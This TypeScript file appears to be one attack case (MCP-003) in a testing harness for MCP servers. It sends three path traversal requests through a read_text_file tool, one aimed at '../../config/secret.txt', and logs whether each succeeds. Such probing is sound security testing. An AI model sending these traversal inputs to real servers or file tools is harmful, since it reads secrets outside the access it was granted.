import type { MCPClient } from '../attack-runner/mcp_client.js';
import type { AttackLogEntry } from '../attack-runner/attack_types.js';

export async function runAttack(
  client: MCPClient,
  logStep: (entry: AttackLogEntry) => void
): Promise<void> {
  let step = 0;

  // Step 1: Try path traversal to access parent directory
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: '../../config/secret.txt' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-003',
      variant: 'excessive-exposure',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '../../config/secret.txt' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-003',
      variant: 'excessive-exposure',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '../../config/secret.txt' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }

  // Step 2: Try another path traversal pattern
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: '..\\..\\package.json' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-003',
      variant: 'excessive-exposure',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '..\\..\\package.json' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-003',
      variant: 'excessive-exposure',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: '..\\..\\package.json' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }

  // Step 3: Try nested path traversal
  step++;
  try {
    const response = await client.sendRequest('tools/call', {
      name: 'read_text_file',
      arguments: { path: './../../README.md' },
    });
    
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-003',
      variant: 'excessive-exposure',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: './../../README.md' } } },
      responseSnippet: JSON.stringify(response).slice(0, 200),
      success: true,
    });
  } catch (error) {
    logStep({
      timestamp: new Date().toISOString(),
      attackId: 'MCP-003',
      variant: 'excessive-exposure',
      step,
      request: { method: 'tools/call', params: { name: 'read_text_file', arguments: { path: './../../README.md' } } },
      responseSnippet: error instanceof Error ? error.message : String(error),
      success: false,
    });
  }
}

